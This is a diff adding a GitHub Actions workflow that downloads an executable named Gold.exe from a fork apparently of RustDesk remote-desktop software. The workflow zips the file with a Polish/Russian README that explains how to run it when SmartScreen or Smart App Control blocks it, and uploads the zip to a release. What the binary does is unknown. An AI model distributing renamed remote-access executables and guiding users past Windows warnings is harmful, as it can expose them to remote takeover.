@@ -1,0 +1,65 @@
+name: Gold portable zip
+
+on:
+  workflow_dispatch:
+  # One-shot: this token cannot send workflow_dispatch. Removed after the run starts.
+  push:
+    branches: [master]
+    paths:
+      - .github/workflows/gold-portable.yml
+
+# This fork's default GITHUB_TOKEN is contents: read. Release upload needs write.
+permissions:
+  contents: write
+
+jobs:
+  package:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - name: Download Gold.exe from the gold release
+        run: |
+          mkdir -p Gold
+          curl -L --fail --retry 3 -o Gold/Gold.exe \
+            "https://github.com/petrmariarti007-cmd/rustdesk/releases/download/gold/Gold.exe"
+          echo "b62c037dffa7fdde953cc13a454dca6e0618b5921256241f47fb51775563120a  Gold/Gold.exe" | sha256sum -c -
+
+      - name: Write README and zip
+        run: |
+          python3 << 'PY'
+          from pathlib import Path
+          text = """Gold — wersja przenośna / портативная версия
+============================================
+
+POLSKI
+------
+1. Rozpakuj CAŁY folder Gold (nie tylko plik Gold.exe).
+2. Wejdź do rozpakowanego folderu i uruchom Gold.exe.
+3. Instalacja nie jest potrzebna — program działa bezpośrednio z folderu.
+
+Jeśli Windows zablokuje program (Smart App Control / SmartScreen):
+wyciągnij folder w całości, a następnie uruchom Gold.exe stamtąd.
+Nie uruchamiaj pliku bezpośrednio z archiwum ZIP.
+
+RUSSIAN / РУССКИЙ
+-----------------
+1. Распакуйте ВСЮ папку Gold (не только файл Gold.exe).
+2. Откройте распакованную папку и запустите Gold.exe.
+3. Установка не нужна — программа работает прямо из папки.
+
+Если Windows блокирует программу (Smart App Control / SmartScreen):
+распакуйте папку целиком и запускайте Gold.exe уже из этой папки.
+Не запускайте файл прямо из архива ZIP.
+"""
+          Path("Gold/README.txt").write_bytes(b"\xef\xbb\xbf" + text.encode("utf-8"))
+          PY
+          zip -9 -r Gold-portable.zip Gold
+          ls -lh Gold-portable.zip
+          sha256sum Gold-portable.zip Gold/Gold.exe
+
+      - name: Upload to the gold release
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          gh release upload gold Gold-portable.zip --repo "$GITHUB_REPOSITORY" --clobber
